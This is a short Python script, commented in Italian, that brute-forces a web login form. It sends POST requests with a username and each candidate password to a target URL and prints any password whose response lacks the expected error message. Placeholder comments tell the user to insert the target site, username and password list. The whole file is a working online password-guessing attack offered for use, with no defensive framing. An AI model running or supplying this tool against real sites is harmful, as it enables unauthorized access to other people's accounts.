# moduli
import threading
import requests
import time
import sys

# Definizione della classe BruteForceCracker per il cracking delle password
class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message

    def crack(self, password):
        # Dizionario dei dati per la richiesta POST
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}

        # Effettua la richiesta POST all'URL specificato con i dati del dizionario
        response = requests.post(self.url, data=data_dict)

        # Controlla se il messaggio di errore specificato è presente nella risposta
        if self.error_message in str(response.content):
            return False
        # Correggi la condizione per il token CSRF
        elif "CSRF" in str(response.content) or "csrf" in str(response.content):
            print("Token CSRF rilevato! BruteForce non funziona su questo sito.")
            sys.exit()
        else:
            # Se la password è stata trovata, stampa l'username e la password
            print(f"Username: ---> {self.username}")
            print(f"Password: ---> {password}")
            return True

# Funzione per craccare le password
def crack_passwords(passwords, cracker):
    # Inizializza il conteggio dei tentativi
    count = 1
    for password in passwords:
        password = password.strip()
        # Stampa il numero di tentativi e la password corrente
        print(f"Tentativo #{count}: Prova con la password '{password}'")
        if cracker.crack(password):
            print("Password trovata!")
            break
        # Incrementa il conteggio dei tentativi
        count += 1

# Esempio di utilizzo
url = "https://example.com/login"  # Sostituisci con l'URL del sito web bersaglio
username = "username"  # Sostituisci con il nome utente
error_message = "Invalid password"  # Sostituisci con il messaggio di errore per password non valide
passwords = ["password1", "password2", "password3"]  # Sostituisci con una lista di password da provare

# Creazione dell'istanza del cracker di password
cracker = BruteForceCracker(url, username, error_message)

# Crack delle password
crack_passwords(passwords, cracker)
